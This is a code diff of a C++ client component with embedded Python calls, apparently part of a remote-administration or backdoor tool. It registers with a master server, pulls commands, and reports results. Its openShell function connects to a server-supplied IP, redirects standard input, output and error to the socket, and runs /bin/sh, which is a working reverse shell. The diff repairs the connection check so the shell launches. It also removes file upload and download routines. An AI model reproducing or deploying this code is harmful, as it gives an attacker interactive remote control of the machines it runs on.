@@ -14,27 +14,53 @@
 #include <errno.h>
 #include <string.h>
 #include <sys/wait.h> //waitpid
+#include <unistd.h>
 
 using namespace std;
 
 clientManager::clientManager(){
+
     pModule =  PyImport_Import(PyUnicode_FromString("link"));
-    link = PyObject_GetAttrString(pModule, "master");
-    void makeRegister();
+    
+    link = PyObject_GetAttrString(pModule, "link");
+    ficar = makeRegister();
 }
 
 clientManager::~clientManager(){
 
 }
 
-vector <string> 
-clientManager::getComand(){//fazer
-    vector <string> saida;
-    return saida;
+
+bool
+clientManager::getRegisterMade()
+{
+    return ficar;
 }
 
+string
+clientManager::getComand()
+{
+    cout << "geting command"<< endl;
+    return PyUnicode_AsUTF8(PyObject_CallMethod(link, "getCMD", NULL));
+}
 
-void
+vector <string>
+clientManager::getArgs()
+{
+    vector <string> saida;
+    cout << "geting args"<< endl;
+
+    Py_ssize_t size = (Py_ssize_t) PyLong_AsLong(PyObject_CallMethod(link, "getArgsSize", NULL));
+    CPyObject lista = PyList_New(size);
+    lista = PyObject_CallMethod(link, "getArgs", NULL);
+    for (long i = 0; (Py_ssize_t)i < size ;i++)
+        saida.push_back(string(PyUnicode_AsUTF8(PyList_GetItem(lista,(Py_ssize_t) i))));
+    
+    return saida;
+    
+}
+
+bool
 clientManager::makeRegister()
 {
     cout << "Registering" << endl;
@@ -44,10 +70,12 @@ clientManager::makeRegister()
     if (isOk==Py_True)
     {
         cout << "Register confirmed" << endl;
+        return true;
     }
     else 
     {
         cout << "Register not confirmed" << endl;
+        return false;
     }
 }
 
@@ -63,6 +91,7 @@ clientManager::openShell(vector<string> cmd)
     int status;
 
     cout << "running shell." << endl;
+
     sa.sin_family = AF_INET;
     sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
     sa.sin_port = htons(port);
@@ -71,94 +100,50 @@ clientManager::openShell(vector<string> cmd)
     //if child
     if(pid_fork==0)
     {
-        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 ){
-            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==-1){
+        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 )
+        {
+            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==0)
+            {
                 dup2(s, 0);
                 dup2(s, 1);
                 dup2(s, 2);
 
                 cout << "starting bash" << endl;
-                
-                char ** envp;
-                envp[0]=(char *)string(".").c_str();
-                envp[1]=nullptr;
 
-                char ** argv;
-                argv[0] = nullptr;
-
-                execve("/bin/sh", argv, envp);
-                //no return
+                system("/bin/sh");
+            }
+            else 
+            {
+                response=string("not connect") + strerror (errno);
             }
         }
-        response=string("shell failed!") + strerror (errno);
+        else {
+            response=string("shell failed!") + strerror (errno);
+        }
+        PyObject_CallMethod(link, "report", "(s)", response.c_str());
         //manager.report(response.c_str());
 
     }
     else
     {
+        cout << "if 1" << endl;
         waitpid(pid_fork,&status,0 );
-        if (WIFEXITED(status)){
+        if (WIFEXITED(status))
+        {
             printf("Exited Normally\n");
         }
     }
     
 }
 
-void 
-clientManager::writefile(vector <string> cmd)
-{
-    if (cmd.size() == 1)
-    {
-        cout << "Sending file: " << cmd[0] << endl;
 
-        CPyObject isOk= PyObject_CallMethod(link, "upload", "(s)", cmd[0].c_str());
-        //upload do server para o client
 
-        if (isOk==Py_True)
-        {
-            PyObject_CallMethod(link, "report", "(s)", "received file"); //arquivo do admin para o cliente
-            cout << "administrator file uploaded." << endl;
-        }
-        else {
-            PyObject_CallMethod(link, "report", "(s)", "don't received file");
-            cout << "administrator file not uploaded." << endl;
-        }
-    }
-    else 
-    {
-        cout << "File upload failed" << endl;
-    }
-}
 
-void 
-clientManager::sendfile(vector <string> cmd)
-{
-    if (cmd.size() == 1)
-    {
-        cout << "File download: " << cmd[0] << endl;
-        CPyObject isOk= PyObject_CallMethod(link, "download", "(s)", cmd[0].c_str());
-
-        if (isOk==Py_True)
-        {
-            PyObject_CallMethod(link, "report", "(s)", "file was sent"); //arquivo do admin para o cliente
-            cout << "upload the file to the administrator" << endl;
-        }
-        else {
-            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
-            cout << "upload the file to the administrator failed" << endl;
-        }
-    }
-    else 
-    {
-        cout << "file download failed." << endl;
-    }
-   
-}
 
 void 
 clientManager::execute(vector <string> cmd)//execProgram
 {
-    cout << "execProgram não implementado" << endl;
+    cout << "execProgram não implementado: " << endl;
     PyObject_CallMethod(link, "report", "(s)", "execProgram não implementado");
 }
 
@@ -201,12 +186,8 @@ clientManager::run(vector <string> cmd)//runCommand
     }
     else 
     {
-        cout << "command not executed" << endl;
+        cout << "command not executed: " << cmd.size() << endl;
     } 
-
-    cout <<"cmd executed" << endl;
-
-    PyObject_CallMethod(link, "report", "(s)", "cmd executed");
 }
 
 void 
